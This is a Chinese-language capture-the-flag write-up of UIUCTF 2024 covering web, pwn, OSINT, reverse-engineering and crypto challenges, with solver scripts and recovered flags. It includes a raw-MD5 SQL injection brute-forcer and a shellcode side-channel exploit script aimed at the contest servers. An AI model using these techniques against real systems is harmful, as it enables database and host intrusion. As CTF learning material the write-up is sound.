# UIUCTF 2024 Writeup

> 原文: https://www.ctfiot.com/191124.html
> ID: 191124

点击蓝字

关注我们

声明

本文作者：CTF战队本文字数：约11653字

阅读时长：约20分钟

附件/链接：点击查看原文下载

本文属于【狼组安全社区】原创奖励计划，未经许可禁止转载

CTF战队正在招新~ 点击 上方图片了解详情！

已开启留言区~欢迎讨论

❝

UIUCTF is an annual capture-the-flag competition hosted by SIGPwny, the cybersecurity club at the University of Illinois Urbana-Champaign (UIUC).

比赛地址 https://2024.uiuc.tf

WEB

Fare Evasion

❝

SIGPwny Transit Authority needs your fares, but the system is acting a tad odd. We’ll let you sign your tickets this time! SIGPwny 交通局需要您的车票，但系统有点奇怪。这次我们让您签票！

img

给了一个secret
img

需要对ticket进行sign

这个 hashed 是什么？
img
img

这里有个 sql 查询，但是我不知道 conductors 的 key，是某个 md5？

在这里 sql 注入吗？md5 不是 sqlite 内置函数，不知道是怎么处理的

 async function pay() {
      // i could not get sqlite to work on the frontend :(
      /*
        db.each(`SELECT * FROM keys WHERE kid = '${md5(headerKid)}'`, (err, row) => {
        ???????
       */
      const r = await fetch("/pay", { method: "POST" });
      const j = await r.json();
      document.getElementById("alert").classList.add("opacity-100");
      // todo: convert md5 to hex string instead of latin1??
      document.getElementById("alert").innerText = j["message"];
      setTimeout(() => { document.getElementById("alert").classList.remove("opacity-100") }, 5000);
    }

sql 查询失败会报错？这个unicode是hashed？
img

 

查不到key会返回空

否则返回对应的key?

跟字符集有关系吗？MD5算法产生的输出本质上是128位的二进制数据

// todo: convert md5 to hex string instead of latin1??

这样思路就很清晰了用二进制md5进行注入

key 不对的情况

接下来我需要查 conductor 的 key

`SELECT * FROM keys WHERE kid = '${md5(headerKid)}'`

md5 可控程度不高，需要 ‘or 1; 这样，如果con的结果在前面的话

`SELECT * FROM keys WHERE kid = ''`

怎样获取符合条件的 md5

爆破了一个

import hashlib
import string

str_list = list(string.ascii_letters)

for i in range(0, len(str_list)):
    for j in range(0, len(str_list)):
        for k in range(0, len(str_list)):
            for l in range(0, len(str_list)):
                for m in range(0, len(str_list)):
                    tmp = str_list[i] + str_list[j] + str_list[k] + str_list[l] + str_list[m]
                    str_hash = hashlib.md5(tmp.encode('utf-8')).digest()
                    if ("'or 1;" in str(str_hash)[2:-1] or "'=0;"  in str(str_hash)[2:-1] ):
                        print(tmp)

import hashlib

a='bQTTC'
b=hashlib.md5(a.encode('utf-8')).digest()
print(b)
#print(dir(b))

看来是不能用 ; 闭合，错信垃圾文章！换 # 重新爆破（#也不行，换 — 了）

想的几个短的 payload

'or'
'=0--
'=0 (如果在末尾)

修改后的爆破脚本

import hashlib
import string

str_list = list(string.ascii_letters)

for i in range(0, len(str_list)):
    for j in range(0, len(str_list)):
        for k in range(0, len(str_list)):
            for l in range(0, len(str_list)):
                for m in range(0, len(str_list)):
                    for z in range(0, len(str_list)):
                        tmp = str_list[i] + str_list[j] + str_list[k] + str_list[l] + str_list[m] + str_list[z]
                        str_hash = hashlib.md5(tmp.encode('utf-8')).digest()
                        if ("'or'"  in str(str_hash)[2:-1]  or  "'=0--"  in str(str_hash)[2:-1]  or "'=0'"==str(str_hash)[:-4] or "'or '"  in str(str_hash)[2:-1]  or "' or'"  in str(str_hash)[2:-1] ):
                            print(tmp)

转换成 md5 就是

xdax82'or'1+xd7Vpx1bwxd7.xb6

Pwn

Syscalls（未解出）

❝

You can’t escape this fortress of security. 你逃不出这个安全堡垒。

附件拖入ida

NX保护没开，看起来只需要发送shellcode，然后程序就会执行了

禁的有点多。。。，openat可以替代open，mmap替代read，write？侧信道？本地可以socket外带，远程好像不出网。。爆了个像是flag的东西，但是交了不对。。。第11位爆不出。。

from pwn import *
context.log_level = "error"
context.arch = "amd64"

def exp(dis,char):
    # shell = asm(shellcraft.amd64.openat(-100,"flag.txtx00",0))
    # shell += asm(shellcraft.amd64.mmap(0x1000000,0x100,1,1,'rax',0))
    shell = b'jx01xfex0c$Hxb8flag.txtPHx89xe6jx9c_1xd21xc0fxb8x01x01x0fx05jx01AZIx89xc0E1xc9xbfx01x01x01x02x81xf7x01x01x01x03xbex01x02x01x01x81xf6x01x03x01x01Lx89xd2jtXx0fx05'

    # loop = '''
    #     mov dl, byte ptr [rdi+{}]
    #     mov cl, {}
    #     cmp cl,dl
    #     jz loop
    #     mov al,60
    #     syscall
    #     loop:
    #     jmp loop
    # '''.format(dis,char)
    loop = b"x8Ax5F"+p8(dis)+b"xB1"+p8(char)+b"x38xD9x74x07xB8x3Cx00x00x00x0Fx05xEBxFE"

    return shell + loop

# uiuctf{a53aaf9aaed1fa5906de364a1162e0833c57a0246ab9ffc}
flag = "uiuctf{"

while True:
    i = len(flag)
    log.success("flag : {}".format(flag))
    for j in range(0x20,0x80):
        try:
            p = remote("syscalls.chal.uiuc.tf", 1337,ssl=True)
            p.recvuntil(b"you.n")
            p.sendline(exp(i,j))
            p.recvline(timeout=2)
            flag += chr(j)
            p.send(b'n')
            log.success("{} pos : {} success".format(i,chr(j)))
            print(flag)
            p.close()
            break
        except KeyboardInterrupt:
            exit(0)
        except:           
            p.close()
    if flag[-1] == "}":
        break

io.interactive()

Misc

Sanity Check

签到

OSINT

An Unlikely Partnership

❝

It appears that the Long Island Subway Authority (LISA) has made a strategic business partnership with a surprise influencer! See if you can figure out who. This is part two of a three-part OSINT suite including Hip With the Youth, An Unlikely Partnership, and The Weakest Link. This challenge is possible without Hip With the Youth but will be easier if you start there.

看来长岛地铁管理局（LISA）已经与一位出人意料的影响者建立了战略商业伙伴关系！看看你能不能弄清楚是谁。

❝

这是由三部分组成的OSINT系列的第二部分，包括《与年轻人嘻哈》、《不太可能的伙伴关系》和《最薄弱的环节》。如果没有《嘻哈青春》，这个挑战是可能的，但如果你从那里开始，会更容易。

Hip With the Youth

❝

The Long Island Subway Authority (LISA), in an attempt to appeal to the younger generations, has begun experimenting with social media! See if you can find a way to a flag through their Instagram. This is part one of a three-part OSINT suite including Hip With the Youth, An Unlikely Partnership, and The Weakest Link. I recommend starting here!

长岛地铁管理局（LISA）为了吸引年轻一代，已经开始尝试社交媒体！看看你是否能通过他们的Instagram找到一种方法来悬挂国旗。

❝

这是由三部分组成的OSINT系列的第一部分，包括《与年轻人嘻哈》、《不太可能的伙伴关系》和《最薄弱的环节》。我建议从这里开始！

Night

❝

That was quite a pretty night view, can you find where I took it? Flag format: uiuctf{street name, city name} Example: uiuctf{East Green Street, Champaign} Some words are blurred out to make the challenge harder, hopefully. Flag format clarification: Use the full type, e.g. Avenue, Street, Road, etc., and include a space between the comma and city name.

那是一个相当漂亮的夜景，你能找到我把它带到哪里吗？标志格式：uiuctf｛街道名称，城市名称｝示例：uiuct夫｛香槟东格林街｝

❝

希望一些单词被模糊了，以使挑战更加困难。标志格式说明：使用完整类型，例如Avenue、Street、Road等，并在逗号和城市名称之间包含空格。

搜索唯一关键大厦找到  Prudential Tower找到了一个大桥 可能是在这个桥上但是flag没拼对 Massachusetts Ave Bridge n

uiuctf{Arlington Street, Boston}

New Dallas

❝

Super wide roads with trains… Is this the new Dallas? Flag format: uiuctf{coordinates of intersection between the rail and the road} Example: uiuctf{41.847, -87.626} Flag format clarification: Use three decimal points of precision, truncate, and do not round. Use Google Maps location for reference. The last digit of the first cooordinate is odd, and the last digit of the second coordinate is even.

有火车的超宽道路。。。这是新的达拉斯吗？标志格式：uiuctf｛铁路和道路交叉点的坐标｝示例：uiductf｛41.847，-87.626｝

❝

标志格式说明：使用小数点后三位的精度，截断和不舍入。使用谷歌地图位置作为参考。第一坐标的最后一位是奇数，第二坐标的最后几位是偶数。

Reverse

Summarize

❝

All you have to do is find six numbers. How hard can that be? 你要做的就是找到六个数字。这能有多难？

附件拖入ida

需要六个九位数，经过一些运算后再判断值是否相等。进入其中一个运算函数，以下图为例，每一bit都做异或操作，但是好像还有附加的，即carry(这个灵感来自gpt)，简单一想，这不就是二进制加法嘛。其它的函数功能都在上图中标明了脚本

import z3

length=6

a=[z3.BitVec('a{}'.format(i),32) for i in range(length)]

x=z3.Solver()
    
for i in range(length):
    x.add(a[i]>100000000)
    x.add(a[i]<=999999999)

v7=a[0]-a[1]
v18=(v7+a[2])%0x10AE961
v19=(a[0]+a[1])%0x1093A1D
v8=a[1]*2
v9=a[0]*3
v10=v9-v8
v20=v10%(a[0]^a[3])
v11=a[2]+a[0]
v21=(a[1]&v11)%0x6e22
v22=(a[1]+a[3])%a[0]
v12=a[3]+a[5]
v23=(a[2]^v12)%0x1CE628
v24=(a[4]-a[5])%0x1172502
v25=(a[4]+a[5])%0x2E16F83

x.add(v18==4139449)
x.add(v19==9166034)
x.add(v20==556569677)
x.add(v21==12734)
x.add(v22==540591164)
x.add(v23==1279714)
x.add(v24 == 17026895)
x.add(v25 == 23769303)

if x.check()==z3.sat:
    print("success")
    m=x.model()
    for i in a:
        if m[i] is not None:
            print(m[i].as_long(),end=' ')
    print("")
else:
    print("failed") 
#705965527 780663452 341222189 465893239 966221407 217433792
#uiuctf{2a142dd72e87fa9c1456a32d1bc4f77739975e5fcf5c6c0}

Goose Chase

❝

The threat group GREGARIOUS GOOSE has hacked into SIGPwny servers and stolen one of our flags! Can you use the evidence to recover the flag? WARNING: This challenge contains malware that may read images on your hard disk. Ensure that you do not have anything sensitive present. 威胁组织合群鹅黑进了SIGPwny的服务器，偷走了我们的一面旗帜！你能用证据找回旗子吗？警告:此挑战包含恶意软件，可能会读取您硬盘上的图像。确保你没有任何敏感的礼物。

题目给了一个流量包和一个两百多兆的dmp文件。流量包第二个带了一个PE文件，不知道是不是关键程序，因为不会分析流量包

使用windbg调试dump文件，输入!analyze -v命令，查看数据，找到了两条可疑数据

FAILURE_BUCKET_ID:  WRONG_SYMBOLS_80000003_ntdll.dll!NtWaitForSingleObject

WATSON_STAGEONE_URL:  http://watson.microsoft.com/StageOne/Goose_exe/0_0_0_0/666dca80/unknown/0_0_0_0/bbbbbbb4/80000003/00000000.htm?Retriage=1

Crypto

X Marked the Spot

❝

A perfect first challenge for beginners. Who said pirates can’t ride trains… 对于初学者来说，这是完美的第一个挑战。谁说海盗不能乘坐火车……

浅浅的异或

from Crypto.Util.number import *
from itertools import cycle
data = open("ct","rb").read()
key1 = bytes_to_long(data[:7]) ^ bytes_to_long(b"uiuctf{") #+ data[-1] ^ b"}"
key2 = data[-1] ^ ord(b"}")
key = long_to_bytes(key1) + long_to_bytes(key2)
for i,j in zip(data,cycle(key)):
    print(chr(i^j),end="")

Without a Trace

❝

Gone with the wind, can you find my flag? 随风而逝，你能找到我的Flag吗？ncat –ssl without-a-trace.chal.uiuc.tf 1337

浅浅的解方程

from sympy import *
from Crypto.Util.number import *
x1,x2,x3,x4,x5 = symbols("x1 x2 x3 x4 x5")

q1 = Eq(3*x1+x2+x3+x4+x5,3008689050337)
q2 = Eq(x1+3*x2+x3+x4+x5,2880443887713)
q3 = Eq(x1+x2+3*x3+x4+x5,2852190263991)
q4 = Eq(x1+x2+x3+3*x4+x5,2327833192163)
q5 = Eq(x1+x2+x3+x4+3*x5,2931740315379)

e = [q1,q2,q3,q4,q5]
res = solve(e)
for i in res:
    print(long_to_bytes(res[i]).decode(),end="")

Determined

❝

“It is my experience that proofs involving matrices can be shortened by 50% if one throws the matrices out.”

Emil Artin

关注公众号回复 UIUCTF2024 可获取全部附件

欢迎师傅们继续挑战，成功可以在留言区讨论学习~

作者

CTF战队

ctf.wgpsec.org

扫描关注公众号回复加群

和师傅们一起讨论研究~

长

按

关

注

WgpSec狼组安全团队

微信号：wgpsec

Twitter：@wgpsec


```
async function pay() {
      // i could not get sqlite to work on the frontend :(
      /*
        db.each(`SELECT * FROM keys WHERE kid = '${md5(headerKid)}'`, (err, row) => {
        ???????
       */
      const r = await fetch("/pay", { method: "POST" });
      const j = await r.json();
      document.getElementById("alert").classList.add("opacity-100");
      // todo: convert md5 to hex string instead of latin1??
      document.getElementById("alert").innerText = j["message"];
      setTimeout(() => { document.getElementById("alert").classList.remove("opacity-100") }, 5000);
    }
```



```
// todo: convert md5 to hex string instead of latin1??
```



```
`SELECT * FROM keys WHERE kid = '${md5(headerKid)}'`
```



```
`SELECT * FROM keys WHERE kid = ''`
```



```
import hashlib
import string

str_list = list(string.ascii_letters)

for i in range(0, len(str_list)):
    for j in range(0, len(str_list)):
        for k in range(0, len(str_list)):
            for l in range(0, len(str_list)):
                for m in range(0, len(str_list)):
                    tmp = str_list[i] + str_list[j] + str_list[k] + str_list[l] + str_list[m]
                    str_hash = hashlib.md5(tmp.encode('utf-8')).digest()
                    if ("'or 1;" in str(str_hash)[2:-1] or "'=0;"  in str(str_hash)[2:-1] ):
                        print(tmp)
```



```
import hashlib

a='bQTTC'
b=hashlib.md5(a.encode('utf-8')).digest()
print(b)
#print(dir(b))
```



```
'or'
'=0--
'=0 (如果在末尾)
```



```
import hashlib
import string

str_list = list(string.ascii_letters)

for i in range(0, len(str_list)):
    for j in range(0, len(str_list)):
        for k in range(0, len(str_list)):
            for l in range(0, len(str_list)):
                for m in range(0, len(str_list)):
                    for z in range(0, len(str_list)):
                        tmp = str_list[i] + str_list[j] + str_list[k] + str_list[l] + str_list[m] + str_list[z]
                        str_hash = hashlib.md5(tmp.encode('utf-8')).digest()
                        if ("'or'"  in str(str_hash)[2:-1]  or  "'=0--"  in str(str_hash)[2:-1]  or "'=0'"==str(str_hash)[:-4] or "'or '"  in str(str_hash)[2:-1]  or "' or'"  in str(str_hash)[2:-1] ):
                            print(tmp)
```



```
xdax82'or'1+xd7Vpx1bwxd7.xb6
```



```
from pwn import *
context.log_level = "error"
context.arch = "amd64"

def exp(dis,char):
    # shell = asm(shellcraft.amd64.openat(-100,"flag.txtx00",0))
    # shell += asm(shellcraft.amd64.mmap(0x1000000,0x100,1,1,'rax',0))
    shell = b'jx01xfex0c$Hxb8flag.txtPHx89xe6jx9c_1xd21xc0fxb8x01x01x0fx05jx01AZIx89xc0E1xc9xbfx01x01x01x02x81xf7x01x01x01x03xbex01x02x01x01x81xf6x01x03x01x01Lx89xd2jtXx0fx05'

    # loop = '''
    #     mov dl, byte ptr [rdi+{}]
    #     mov cl, {}
    #     cmp cl,dl
    #     jz loop
    #     mov al,60
    #     syscall
    #     loop:
    #     jmp loop
    # '''.format(dis,char)
    loop = b"x8Ax5F"+p8(dis)+b"xB1"+p8(char)+b"x38xD9x74x07xB8x3Cx00x00x00x0Fx05xEBxFE"

    return shell + loop

# uiuctf{a53aaf9aaed1fa5906de364a1162e0833c57a0246ab9ffc}
flag = "uiuctf{"

while True:
    i = len(flag)
    log.success("flag : {}".format(flag))
    for j in range(0x20,0x80):
        try:
            p = remote("syscalls.chal.uiuc.tf", 1337,ssl=True)
            p.recvuntil(b"you.n")
            p.sendline(exp(i,j))
            p.recvline(timeout=2)
            flag += chr(j)
            p.send(b'n')
            log.success("{} pos : {} success".format(i,chr(j)))
            print(flag)
            p.close()
            break
        except KeyboardInterrupt:
            exit(0)
        except:           
            p.close()
    if flag[-1] == "}":
        break

io.interactive()
```



```
import z3

length=6

a=[z3.BitVec('a{}'.format(i),32) for i in range(length)]

x=z3.Solver()
    
for i in range(length):
    x.add(a[i]>100000000)
    x.add(a[i]<=999999999)

v7=a[0]-a[1]
v18=(v7+a[2])%0x10AE961
v19=(a[0]+a[1])%0x1093A1D
v8=a[1]*2
v9=a[0]*3
v10=v9-v8
v20=v10%(a[0]^a[3])
v11=a[2]+a[0]
v21=(a[1]&v11)%0x6e22
v22=(a[1]+a[3])%a[0]
v12=a[3]+a[5]
v23=(a[2]^v12)%0x1CE628
v24=(a[4]-a[5])%0x1172502
v25=(a[4]+a[5])%0x2E16F83

x.add(v18==4139449)
x.add(v19==9166034)
x.add(v20==556569677)
x.add(v21==12734)
x.add(v22==540591164)
x.add(v23==1279714)
x.add(v24 == 17026895)
x.add(v25 == 23769303)

if x.check()==z3.sat:
    print("success")
    m=x.model()
    for i in a:
        if m[i] is not None:
            print(m[i].as_long(),end=' ')
    print("")
else:
    print("failed") 
#705965527 780663452 341222189 465893239 966221407 217433792
#uiuctf{2a142dd72e87fa9c1456a32d1bc4f77739975e5fcf5c6c0}
```



```
FAILURE_BUCKET_ID:  WRONG_SYMBOLS_80000003_ntdll.dll!NtWaitForSingleObject

WATSON_STAGEONE_URL:  http://watson.microsoft.com/StageOne/Goose_exe/0_0_0_0/666dca80/unknown/0_0_0_0/bbbbbbb4/80000003/00000000.htm?Retriage=1
```



```
from Crypto.Util.number import *
from itertools import cycle
data = open("ct","rb").read()
key1 = bytes_to_long(data[:7]) ^ bytes_to_long(b"uiuctf{") #+ data[-1] ^ b"}"
key2 = data[-1] ^ ord(b"}")
key = long_to_bytes(key1) + long_to_bytes(key2)
for i,j in zip(data,cycle(key)):
    print(chr(i^j),end="")
```



```
from sympy import *
from Crypto.Util.number import *
x1,x2,x3,x4,x5 = symbols("x1 x2 x3 x4 x5")

q1 = Eq(3*x1+x2+x3+x4+x5,3008689050337)
q2 = Eq(x1+3*x2+x3+x4+x5,2880443887713)
q3 = Eq(x1+x2+3*x3+x4+x5,2852190263991)
q4 = Eq(x1+x2+x3+3*x4+x5,2327833192163)
q5 = Eq(x1+x2+x3+x4+3*x5,2931740315379)

e = [q1,q2,q3,q4,q5]
res = solve(e)
for i in res:
    print(long_to_bytes(res[i]).decode(),end="")
```



```
[
  [p, 0, x, 0, x],
  [0, x, 0, x, 0],
  [x, 0, x, 0, x],
  [0, q, 0, r, 0],
  [x, 0, x, 0, 0]
]（x表示能控制的地方）
```



```
[
  [p, 0, 0, 0, 0],
  [0, 1, 0, 0, 0],
  [0, 0, 0, 0, 1],
  [0, q, 0, r, 0],
  [0, 0, 1, 0, 0]
]
```



```
from Crypto.Util.number import *
import math
n = 158794636700752922781275926476194117856757725604680390949164778150869764326023702391967976086363365534718230514141547968577753309521188288428236024251993839560087229636799779157903650823700424848036276986652311165197569877428810358366358203174595667453056843209344115949077094799081260298678936223331932826351
e = 65535
c = 72186625991702159773441286864850566837138114624570350089877959520356759693054091827950124758916323653021925443200239303328819702117245200182521971965172749321771266746783797202515535351816124885833031875091162736190721470393029924557370228547165074694258453101355875242872797209141366404264775972151904835111

pr = 89650932835934569650904059412290773134844226367466628096799329748763412779644167490959554682308225788447301887591344484909099249454270292467079075688237075940004535625835151778597652605934044472146068875065970359555553547536636518184486497958414801304532202276337011187961205104209096129018950458239166991017

p = math.gcd(n,pr)
q = n // p

phi = (p-1)*(q-1)
d = pow(e,-1,phi)
m = pow(c,d,n)
print(long_to_bytes(m))
```



```
from Crypto.Util.number import *
def solve(ww):
    a =  [66128, 61158, 36912, 65196, 15611, 45292, 84119, 65338]
    ct = [273896, 179019, 273896, 247527, 208558, 227481, 328334, 179019, 336714, 292819, 102108, 208558, 336714, 312723, 158973, 208700, 208700, 163266, 244215, 336714, 312723, 102108, 336714, 142107, 336714, 167446, 251565, 227481, 296857, 336714, 208558, 113681, 251565, 336714, 227481, 158973, 147400, 292819, 289507]
    C = ct[ww]
    M = a
    pk = M
    ct = C
    n = len(pk)

    # Sanity check for application of low density attack
    d = n / log(max(pk), 2)
    assert CDF(d) < 0.9408
    M = Matrix.identity(n) * 2

    last_row = [1 for x in pk]
    M_last_row = Matrix(ZZ, 1, len(last_row), last_row)

    last_col = pk
    last_col.append(ct)
    M_last_col = Matrix(ZZ, len(last_col), 1, last_col)

    M = M.stack(M_last_row)
    M = M.augment(M_last_col)

    X = M.BKZ()

    sol = []
    for i in range(n + 1):
        testrow = X.row(i).list()[:-1]
        if set(testrow).issubset([-1, 1]):
            for v in testrow:
                if v == 1:
                    sol.append(0)
                elif v == -1:
                    sol.append(1)
            break

    s = sol
    return s
flag=''
for ee in range(len(ct)):
    rr=solve(ee)
    pp=''
    for tt in rr:
        pp+=str(tt)
    flag+=chr(int(pp,2))
print(flag)
#uiuctf{i_g0t_sleepy_s0_I_13f7_th3_fl4g}
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/07/8-1719992516.gif)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/07/6-1719992516.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/07/10-1719992517.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/07/10-1719992517.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/07/2-1719992517.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/07/8-1719992518.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/07/9-1719992518.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/07/4-1719992518.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/07/4-1719992519.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/07/2-1719992519.png)